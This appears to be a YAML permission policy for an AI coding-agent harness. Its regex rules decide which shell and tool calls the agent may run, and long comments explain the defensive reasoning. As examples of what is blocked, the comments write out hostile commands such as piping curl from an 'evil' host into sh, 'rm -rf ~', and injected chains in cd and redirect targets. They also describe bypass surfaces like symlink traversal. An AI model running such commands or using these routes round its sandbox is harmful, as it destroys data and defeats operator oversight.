# -- claude-pilot permission policy ----------------------------------------
#
# Schema:
#   rules:          Ordered list of rules. First match wins.
#     - id:         Unique identifier for audit trail
#       tool:       Tool name to match (case-sensitive, e.g. "Bash", "Skill")
#       pattern:    Regex matched against the tool's primary input field:
#                     Bash  -> command
#                     Write/Edit/Read -> file_path
#                     Glob/Grep -> pattern
#                     Skill -> skill name
#                     Other -> str(tool_input)
#       decision:   "allow" | "deny" | "escalate"
#                     "escalate" returns deny + best-effort operator notify
#                     (deny-with-notify; see permissions.py handler dispatch).
#       reason:     Human-readable explanation (shown in logs, notify payload)
#
#   default:        Fallback when no rule matches.
#     decision:     "allow" | "deny" | "escalate"
#     reason:       Human-readable explanation
#
# Notes:
#   - Tier 1 fast-path (read-only file ops, safe binaries) is consulted before
#     this file via permissions.py::is_tier1_auto_approve. Anything that takes
#     that path is auto-allowed without entering the rules list.
#   - Operator override: set MIKA_PILOT_POLICY_PATH=<path> to point at a
#     different file. Used for temporary overlays (e.g. widened groom-phase
#     allowlists) without rebuilding cpp. The override remains as escape
#     hatch; this bundled file is the production default.
#   - Groom-phase rules were derived from groom-phase pilot evidence (mika
#     dispatch-lib `_run_claude_pilot` calls captured 2026-05-28). Dev-pilot
#     phase Bash footprint (mkdir / PATH-bootstrap / cp-mv-rm / cargo / npm /
#     uv / node) was enumerated 2026-06-03 (claude-pilot#25) from the blocked
#     dispatches mika#1116, mika#1260, mika#765.
#   - Why broad-looking `allow` rules below are safe: a policy rule matches a
#     single regex against the WHOLE command string (policy.py first-match-wins
#     — no compound-split, no danger scan). permissions.py
#     `_bash_allow_is_chain_safe` backstops this by mirroring tier1's ALLOW-LIST
#     model over a compound: every chained segment must independently be
#     tier1-safe or a clean policy allow, so a dangerous tail (`mkdir foo &&
#     curl evil | sh`, `… && rm -rf ~`) is vetoed and downgraded to deny. File
#     creation goes through the Write/Edit tools (tier1 path-containment), so no
#     Bash file-editor rule is needed here.
# --------------------------------------------------------------------------

rules:
  # ---- Tight-shape compound rules (MUST precede broader single-command rules) ----
  # First-match-wins ordering: these anchored/whole-command rules claim their
  # match before a broader `^find\s`/`\sgrep\s` rule catches an inner token via
  # policy.py's `re.search`. Chain-safe then honors these rule_ids as
  # whole-command exemptions (see `_bash_allow_is_chain_safe`), so the internal
  # `;` of the compound is not split-vetoed.
  #
  # `bash-for-loop-safe-body` — see permissions.yaml design comment below the
  # existing `bash-for-loop-orientation`. Must be evaluated BEFORE `bash-grep`
  # (whose `\sgrep\s` matches ` grep ` inside a for-body, claims the rule_id,
  # and then chain-safe splits do/done and vetoes on the `done` sub).

  - id: bash-for-loop-safe-body
    tool: Bash
    pattern: '^for\s+\w+\s+in\s+[^;|&`><\\]+;\s*do\s+(echo|printf|grep|cat|head|tail|ls|wc|find(?![^;]*(?:-delete|-exec|-execdir|-ok|-okdir|-fprint|-fls|-fprintf)\b)|test|\[|dirname|basename)(?![\w.\-/])([^;|&`><\\]*);\s*done\s*$'
    decision: allow
    reason: "for-loop with enumerated read-only body (echo/printf/grep/cat/head/tail/ls/wc/find/test/[/dirname/basename); `find` action flags (-delete/-exec*/-ok*/-fprint*/-fls) excluded; in-list + body-args exclude chain metachars/redirects/escapes; $var permitted (substitution caught upstream); fully anchored (cpp#92, hardened cpp#151)"

  # cpp#100: dev-groom's "explore-then-execute-with-fallback" compound.
  # Founding evidence — mika-spirit task 1a4244b6 (groom mika#1867) halted
  # 2026-08-03T08:02:14Z on the exact shape:
  #   cat scripts/derive-branch-name 2>/dev/null | head -30;
  #   echo "===DERIVE===";
  #   ./scripts/derive-branch-name "fix" "1867" "..." 2>/dev/null || echo "..."
  # Loop stall context: mika-platform autonomous loop produced 0 auto-merges
  # for 5 days (since #1874) — every groom hit this wall. Vincent-ratified
  # 2026-08-03 via samidarko-proxy (Option A, extend allowlist).
  #
  # Shape template (Vincent-worded):
  #   <safe-read> ; <echo-literal> ; <script-exec-with-args> [2>/dev/null] || <echo-literal>
  #
  # Per-segment safety invariants (embedded in the anchored regex):
  #   1. <safe-read>: `cat <path>` with optional `2>/dev/null` + optional
  #      `| head -N`. Path charset excludes shell metachars.
  #   2. <echo-literal>: `echo "<quoted>"` — quoted body charset excludes
  #      `"`, backtick, `$`, `;`, `|`, `<`, `>`, `&`, `\` (no substitution,
  #      no chained danger, no escapes).
  #   3. <script-exec-with-args>: `./scripts/<name>` where <name> is POSIX-safe
  #      (no `..`, no `/` — single-level under `scripts/`), plus 0+ quoted
  #      args with the same restricted charset as (2). Optional `2>/dev/null`.
  #   4. `|| <echo-literal>` fallback optional.
  # Full-command anchoring (`^...$`) + charset-restricted quoted args prevent
  # chained danger from riding any layer. Chain-safe honors the `rule_id` as
  # a whole-command exemption (mirroring `bash-git-show-redirect` cpp#35 and
  # `bash-for-loop-safe-body` cpp#92 patterns) — no `;`/`||` split-veto.
  # The rule_id coupling fails CLOSED: if renamed or dropped, dispatch reverts
  # to the current veto (safe direction).
  - id: bash-explore-script-fallback
    tool: Bash
    pattern: '^cat\s+[A-Za-z0-9_./\-]+(\s+2>/dev/null)?(\s*\|\s*head\s+-\d+)?\s*;\s*echo\s+"[^"`$;|<>&\\]*"\s*;\s*\./scripts/[A-Za-z0-9_.\-]+(\s+"[^"`$;|<>&\\]*")*(\s+2>/dev/null)?(\s*\|\|\s*echo\s+"[^"`$;|<>&\\]*")?$'
    decision: allow
    reason: "dev-groom explore-then-execute-with-fallback: cat<path>[2>/dev/null][|head-N] ; echo\"<literal>\" ; ./scripts/<name>[<quoted-args>][2>/dev/null] [|| echo\"<literal>\"]; fully anchored, charset-restricted quoted args exclude chain metachars (cpp#100 — 5-day loop stall)"

  # ---- Read-only repo orientation ----
  # Common pre-work Bash commands that pilots use to understand the codebase
  # before making changes. Confirmed in mika#1253's pre-wedge pilot log.

  # cpp#97: bare `cd <absolute-path>` — pilot uses this to enter its worktree at
  # session start. Tier1 has `cd` in SAFE_SHELL_COMMANDS but production evidence
  # (mika#1689 halted 2× in 15min post cpp#96 deploy on this exact shape) shows
  # the tier1 auto-approve path is not firing for absolute worktree paths — root
  # cause under investigation. Explicit YAML allow rule short-circuits the
  # mystery: `policy.evaluate()` returns allow with rule_id `bash-cd`,
  # `_bash_allow_is_chain_safe` verifies chain safety (single-segment `cd <path>`
  # is trivially safe). Path charset restricted to POSIX-safe chars — no shell
  # metacharacters, no `..` (canonicalized-path assumption; path traversal is
  # not a concern here since the pilot's cwd is already sandboxed by the
  # worktree). Failure mode blocked: an attacker-controlled `cd '; rm -rf ~'`
  # fails the charset restriction (contains `'`) and falls through.
  - id: bash-cd
    tool: Bash
    pattern: "^cd\\s+[A-Za-z0-9_./\\-]+/?$"
    decision: allow
    reason: "cd for worktree navigation (cpp#97 — tier1 gap on absolute worktree paths)"

  - id: bash-find
    tool: Bash
    pattern: "^find\\s"
    decision: allow
    reason: "find for repo orientation"

  - id: bash-grep
    tool: Bash
    pattern: "^grep\\s|\\sgrep\\s"
    decision: allow
    reason: "grep for source-code research"

  - id: bash-jq
    tool: Bash
    pattern: "^(for\\s.*do\\s+.*\\s)?jq\\s|[;|]\\s*jq\\s"
    decision: allow
    reason: "jq for skill-manifest and JSON inspection (also `cmd | jq …` pipeline)"

  # `bash-for-loop-orientation` — broad-shape fall-through. The tight-shape
  # `bash-for-loop-safe-body` at the top of the rules table claims for-loops
  # matching the enumerated-body + arg-charset invariants (whole-command
  # exemption in chain-safe). Any for-loop NOT matching that tight shape falls
  # through here — its policy allow is honored but chain-safe re-splits on `;`
  # and typically vetoes on the un-tier1-safe `do <body>` / `done` segments.
  # That over-block is the safe direction: only the sanctioned tight shape
  # gets auto-approval; broader shapes route to relay.
  #
  # Design invariants of `bash-for-loop-safe-body` (mirrored in the rule at the
  # top of the rules table so the two can be maintained together):
  #
  #   - `in`-list charset `[^;|&`><\\]+` — excludes chain metachars (`;`,`|`,`&`),
  #     backtick, redirects (`<`,`>`) and shell escape (`\`). Permits `$var`
  #     parameter expansion (safe: substitution is caught UPSTREAM by
  #     `_bash_allow_is_chain_safe`'s substitution-marker guard, which vetoes
  #     any `$(`, backtick, `$'` BEFORE this rule is evaluated).
  #   - Body command is one of 13 read-only shell primitives (all in tier1
  #     SAFE_SHELL_COMMANDS). Enumerated closed-world; no `eval`/`sh`/`bash`.
  #     `find` carries an extra negative lookahead over its own body: the arg
  #     charset excludes `;` (so `-exec … \;` cannot match) but NOT `-exec … {} +`
  #     nor `-delete`, both of which execute or destroy. Closed cpp#151 while
  #     writing the sibling battery — a pre-existing hole, found by testing the
  #     rule rather than the ticket.
  #     The `(?![\w.\-/])` tail after the alternation closes the same class of
  #     hole by word prefix: without it `cat` claimed `catastrophe` and `ls`
  #     claimed `lsof`, so an arbitrary binary whose name starts with an
  #     allow-listed word ran under a closed-world allow-list.
  #   - Body args — same charset: excludes chain/redirect/escape; permits
  #     `$var` and quoted strings with variables (`"step $i"`).
  #   - Fully anchored `^…\s*done\s*$` — nothing rides before `for` or after
  #     `done`. A trailing chain (`… ; done && rm -rf ~`) fails the anchor
  #     and falls through to this broader rule where chain-safe splits and
  #     vetoes the tail.
  #
  # Upstream defense-in-depth (before either rule matches):
  #   1. `contains_unquoted_metacharacter` (tier1) catches `$(`, backtick, `$'`
  #      in double-quoted and unquoted regions → tier1 denies → routes to policy.
  #   2. `_bash_allow_is_chain_safe` opening guards veto `$(` (unless
  #      allowlisted), backtick, `$'`, funsub — BEFORE evaluating any rule. So
  #      the `$` this rule permits can only be a bare parameter expansion.
  #
  # Founding evidence: mika-platform PUSH FORT 2026-07-28 (throughput rupture A,
  # 60% of pilot failures 24h 2026-07-27→28).
  - id: bash-for-loop-orientation
    tool: Bash
    pattern: "^for\\s+\\w+\\s+in\\s.*;\\s*do\\s"
    decision: allow
    reason: "shell-for loops for batch orientation queries — broad-shape fall-through for cases not covered by bash-for-loop-safe-body; chain-safe still applies (splits do/done body — typically vetoes)"

  # cpp#151 volet A — `cd <dir> && for …` (AC3). Same contract as
  # `bash-for-loop-orientation` directly above: a BROAD selector whose only job
  # is to reach chain-safe. It grants nothing on its own — `_bash_allow_is_chain_safe`
  # then either recognises the whole command as a sanctioned read-only loop
  # (`_is_sanctioned_readonly_for_loop`, which is where every safety invariant
  # lives, including the worktree-relative constraint on the `cd` target) or
  # splits on `&&`/`;` and vetoes, as it does today.
  #
  # Why the selector is needed at all: without it, `cd docs && for f in *.md;
  # do echo $f; cat $f; done` matches NO rule and dies on the policy default
  # before chain-safe is ever consulted. The loop-only form reached chain-safe
  # by accident — via `bash-grep`'s `\sgrep\s` — which is precisely the
  # mis-arbitration cpp#151 documents.
  #
  # The path charset here excludes chain metachars/redirects/escapes so the
  # selector cannot itself be the thing that matches a chained danger; it stays
  # deliberately LOOSER than the helper (it admits `..`, `~`, absolute paths),
  # because over-selecting is harmless — chain-safe is the decision — while
  # under-selecting reproduces the default-deny that founded this ticket.
  - id: bash-cd-for-loop-orientation
    tool: Bash
    pattern: "^cd\\s+[^\\s;|&`><\\\\]+\\s*&&\\s*for\\s+\\w+\\s+in\\s.*;\\s*do\\s"
    decision: allow
    reason: "cd <dir> && for … — broad-shape selector so chain-safe can arbitrate the loop; `_is_sanctioned_readonly_for_loop` carries the invariants, otherwise chain-safe splits and vetoes (cpp#151 volet A, AC3)"

  - id: bash-cat-heredoc-tmp
    tool: Bash
    pattern: "^cat\\s+>\\s+/tmp/(?!.*\\.\\.)\\S*\\s*<<\\s*'?EOF'?"
    decision: allow
    reason: "heredoc to /tmp for helper scripts (groom-phase); path is a single /tmp token (no spaces/chains) and no .. traversal -- chained-danger guard also enforces sole-command + no-trailing"

  # ---- Git operations ----
  # The slash-command-driven groom phase requires git read + plan-doc commit
  # + push. Read-only ops are always safe; commit/push are gated by the
  # slash command's own state machine, not by policy.

  # `git show <SHA>:<path> > <relative-path>` — the dispatch-lib pattern for
  # re-importing a grooming plan from its source commit into a fresh worktree
  # (cpp#35; mika-arch session 783d4a04). Must precede bash-git-readonly so the
  # sanctioned shape claims this rule_id (first-match-wins). SAFE because:
  #   - source is `[a-f0-9]+:` — an IMMUTABLE git object (a hex commit SHA), not
  #     a movable branch/tag ref. `HEAD`/`main`/`develop`/`feature/*` do not
  #     match, closing the ref-mutability TOCTOU (bypass surface B3). Edge: a
  #     branch literally named with only hex chars (e.g. `abcdef`) would match —
  #     the architect accepted this pathological edge in the GROOMED verdict.
  #   - the redirect TARGET is a literal worktree-relative token: leading `/`
  #     (absolute), leading `~`, and any `..` are rejected by lookaheads; the
  #     `[\w./-]+` char class excludes `$`, backtick, `(`, space and `>`, so no
  #     shell expansion / substitution / chaining can ride the target.
  #   - the SOURCE path char class `[\w./-]+` likewise excludes `$(`/backtick.
  # STATIC RESIDUAL (cpp#38) — now closed one layer up at runtime: this string
  # pattern still rejects only literal `../` and CANNOT detect SYMLINK traversal
  # (`> esc/passwd` where `esc` is a committed symlink to `../OUTSIDE`). Symlinks
  # are a runtime filesystem property invisible to string matching, so the regex
  # is intentionally NOT tightened (that would break the legitimate multi-
  # component target `docs/plans/X.md`). Worktree containment is enforced at the
  # honoring point instead: permissions.py `_destination_veto_reason` resolves
  # the redirect target against the worktree root and vetoes any escape (cpp#38)
  # and any control-plane landing (cpp#42), AFTER `_bash_allow_is_chain_safe`.
  # The same validator gates the `bash-cp-mv` / `bash-mkdir` destinations. See
  # docs/solutions/security-issues/command-string-policy-allow-rules-are-
  # compound-unsafe.md §5 / §11. TOCTOU residual of `Path.resolve` is accepted
  # (same as the Write tool's `is_within_project`).
  # Anchored `^...$` is load-bearing: policy.evaluate uses re.search with NO
  # re.MULTILINE, so `$` honors only a single trailing newline — a multi-line
  # injection (`> foo\nrm -rf /`) cannot match here and falls through to the
  # bash-git-readonly path, where _bash_allow_is_chain_safe splits on `\n` and
  # vetoes the dangerous segment. The chain-safe guard in permissions.py honors
  # THIS rule_id as a sanctioned exception to its wholesale `>` veto (the only
  # place that ban is lifted besides the /tmp heredoc) — keep the id in sync.
  - id: bash-git-show-redirect
    tool: Bash
    pattern: '^git\s+show\s+[a-f0-9]+:[\w./-]+\s*>\s*(?!/)(?!~)(?!.*\.\.)[\w./-]+\s*$'
    decision: allow
    reason: "git show <ref>:<path> > <relative-path> -- source is ANY hex-shaped ref (full SHA, abbreviated SHA, OR a hex-named branch/tag; NOT immutable -- `git show deadbeef:f` resolves to a mutable, force-pushable branch, cpp#43); safety rests entirely on the literal redirect target (no absolute / ~ / .. / shell-expansion) plus the control-plane denylist (cpp#42), never on source-immutability; permissions.py _bash_allow_is_chain_safe honors this rule_id as a sanctioned redirect (cpp#35)"

  - id: bash-git-readonly
    tool: Bash
    pattern: "^git\\s+(status|log|diff|show|branch|rev-parse|fetch|ls-remote|worktree|merge-base)"
    decision: allow
    reason: "git read-only operations (merge-base is common-ancestor SHA lookup, no side effects — added 2026-07-27 with 18-incident compound-bash class)"

  # ---- Dispatch-lib deterministic helper scripts ----
  # `./scripts/derive-{branch-name,worktree-path,phase-from-body}` are the
  # deterministic shell helpers used by `_shared/dispatch-lib.sh` (mika-platform)
  # to compute worktree paths, branch refs, and phase-from-body from a groom
  # brief. Each is:
  #   - PURE COMPUTATION: reads its args, prints one identifier to stdout.
  #   - NO FILESYSTEM WRITES: no `>`, no `mkdir`, no `cp/mv/rm`, no `sed -i`.
  #   - NO NETWORK: no `curl`, `wget`, `gh`, `git push`.
  #   - NO SUBPROCESS: no `sh -c`, `bash -c`, `eval`, `source`.
  #
  # The rule allow-shape is anchored + argument-charset restricted so a
  # malicious pilot cannot smuggle metachars into an arg to escape the script's
  # own sanitization:
  #   - `^\./scripts/derive-(…)` closed-world script set (3 named scripts only)
  #   - `(\s+[\w./=:-]+)*` args restricted to word-chars + dot/slash/=/colon/hyphen
  #     — excludes `$`, backtick, quotes, pipe, semicolon, ampersand, redirects,
  #     spaces (except separator). No substitution risk at THIS layer.
  #   - `\s*$` trailing anchor — nothing rides after the last arg.
  #
  # Chain-safety (`_bash_allow_is_chain_safe`) still applies compound-wide, so
  # `./scripts/derive-branch-name x && rm -rf ~` still vetoes on the tail segment.
  #
  # Founding evidence: 18-incident policy:deny class 2026-07-26 → 2026-07-27
  # (compound-bash tier1/tier2 gap). Multiple incidents cited
  # `./scripts/derive-branch-name … 2>/dev/null || echo …` as the deny trigger.
  # Widening the closed-set (adding a 4th script) requires evidence + a separate
  # ticket per cpp#34 discipline (mika-arch session 783d4a04).
  - id: bash-derive-scripts
    tool: Bash
    pattern: '^\./scripts/derive-(branch-name|worktree-path|phase-from-body)(\s+[\w./=:-]+)*\s*(2>/dev/null)?\s*$'
    decision: allow
    reason: "./scripts/derive-{branch-name,worktree-path,phase-from-body} — dispatch-lib deterministic helpers, pure stdout print, arg charset restricted to [\\w./=:-] (no metachars/substitution)"

  - id: bash-git-stage-commit
    tool: Bash
    pattern: "^git\\s+(add|commit)"
    decision: allow
    reason: "git add + git commit (plan-authoring phase)"

  - id: bash-git-push
    tool: Bash
    pattern: "^git\\s+push(\\s|$)"
    decision: allow
    reason: "git push (groom-phase plan publication)"

  # ---- GitHub CLI read-only ops ----

  - id: bash-gh-issue-read
    tool: Bash
    pattern: "^gh\\s+issue\\s+(view|list)"
    decision: allow
    reason: "gh issue view/list (ticket grounding)"

  - id: bash-gh-pr-read
    tool: Bash
    pattern: "^gh\\s+pr\\s+(view|list|diff|checks)"
    decision: allow
    reason: "gh pr view/list/diff/checks (PR grounding)"

  # ---- GitHub CLI write -- gated ----
  # gh issue create is handled by the mika-issue skill, which routes
  # through agent-tier authority. Direct CLI use bypasses that.

  - id: gh-issue-create-deny
    tool: Bash
    pattern: "gh\\s+issue\\s+create"
    decision: deny
    reason: "gh issue create is handled by mika-issue skill -- direct CLI use denied"

  # ---- Skill tool -- non-platform agent escalation ----

  - id: mika-ask-non-platform-agent
    tool: Skill
    pattern: "^mika-ask$"
    decision: escalate
    reason: "mika-ask targets external agents -- escalate (deny + notify) for operator review"

  # ---- Dev-pilot phase (claude-pilot#25) ----
  # Bash footprint the dev-pilot pipeline needs but groom-phase rules never
  # covered. Chained-danger safety is enforced by permissions.py
  # `_bash_allow_is_chain_safe`, which mirrors tier1's ALLOW-LIST model over a
  # compound: a chained segment is honored only if it is independently
  # tier1-safe or itself a clean policy allow (so `mkdir x && curl evil | sh` is
  # vetoed). These patterns therefore (a) match the intended command shape and
  # (b) reject absolute paths, `..` traversal, and `~`/`$` home-or-var
  # expansion so worktree-scoping is not bypassable post-expansion. cargo/npm
  # and the safe npx subset are already tier1-auto-approved standalone; the
  # rules here cover them inside a PATH-bootstrap compound and as defense-in-
  # depth.
  #
  # WRITE DESTINATIONS (cpp#38 + cpp#42): the `bash-cp-mv` and `bash-mkdir` rules
  # below are string-only and symlink-blind — like `bash-git-show-redirect`. The
  # destination operand(s) of all three are validated at runtime in permissions.py
  # `_destination_veto_reason` (worktree containment FIRST, control-plane denylist
  # SECOND) at the single point a Bash `allow` is honored. Rule logic stays here;
  # destination containment lives in code (the YAML cannot resolve the filesystem).

  - id: bash-mkdir
    tool: Bash
    pattern: '^mkdir(\s+-\S+)*\s+(?!/)(?!~)(?!\$)(?!.*\.\.)\S'
    decision: allow
    reason: "mkdir (relative, no .. / absolute / ~ / $ expansion) -- dev-pilot worktree scaffolding (mika#1116: mkdir -p crates/mika-os/src)"

  - id: bash-cp-mv
    tool: Bash
    pattern: '^(cp|mv)\s+(?!/)(?!~)(?!\$)(?!.*\s/)(?!.*\s~)(?!.*\s\$)(?!.*\.\.)\S'
    decision: allow
    reason: "cp/mv (relative operands, no .. / absolute / ~ / $ on any operand) -- dev-pilot file moves within worktree"

  - id: bash-rm
    tool: Bash
    pattern: '^rm\s+(?!-)(?!/)(?!~)(?!\$)(?!.*\s/)(?!.*\s~)(?!.*\.\.)\S'
    decision: allow
    reason: "rm of relative path(s), NO flags -- dev-pilot cleanup only; any -r/-f/-rf or absolute/~ routes to relay (denied here)"

  - id: bash-cargo
    tool: Bash
    pattern: '^cargo\s+(build|test|check|clippy|fmt|run|clean|doc|tree)\b'
    decision: allow
    reason: "cargo build/test/check/clippy/fmt/run/clean/doc/tree -- dev-pilot Rust toolchain (cargo publish excluded, tier3-denied)"

  - id: bash-npm
    tool: Bash
    pattern: '^npm\s+(ci|install|run|test|start)\b'
    decision: allow
    reason: "npm ci/install/run/test/start -- dev-pilot Node toolchain (mika#1260)"

  - id: bash-uv
    tool: Bash
    pattern: '^uv\s+(?:sync|lock|venv|add|pip|tool\s+install)\b'
    decision: allow
    reason: "uv sync/lock/venv/add/pip/tool install -- dev-pilot Python deps (CLAUDE.md: uv tool install --force .). uv run/tool run excluded -- arbitrary-exec primitives"

  - id: bash-uv-run
    tool: Bash
    pattern: '^uv\s+run\s+(?:pytest|ruff|mypy|pyright|python\s+-m\s+(?:pytest|ruff|mypy|pyright))\b'
    decision: allow
    reason: "uv run <test/lint tool only> -- dev-pilot quality gates (cpp CLAUDE.md: uv run pytest/ruff/mypy). Arbitrary `uv run <cmd>` / `uv run python -c` / `uv run bash` route to relay"

  - id: bash-node
    tool: Bash
    pattern: '^node\s+(?!-)(?!/)(?!~)(?!\$)(?!.*\.\.)\S+\.(?:c|m)?js\b'
    decision: allow
    reason: "node <relative script.js|.mjs|.cjs>, NO leading flag, no absolute/~/$/.. -- dev-pilot in-worktree Node execution (mika#1260). Inline eval (-e/-p/--eval/--print), module preload (-r/--require/--import/--loader), /dev/stdin, combined short flags, and out-of-worktree paths all route to relay; npx left to tier1's tsc/vitest/prettier/eslint allow-list"

  - id: bash-export-path-bootstrap
    tool: Bash
    pattern: '^export\s+PATH=(?!.*\.\.)["'']?(?:\$HOME/[^":''\s]+:)+\$PATH'
    decision: allow
    reason: "PATH bootstrap whose every prepended segment is $HOME/<dir> ending :$PATH (no injected/absolute/.. dir) -- dev-pilot shell-env setup (mika#1260)"

default:
  decision: deny
  reason: "no matching policy rule -- denied by default (production posture; widen rules to allow new tool footprints)"
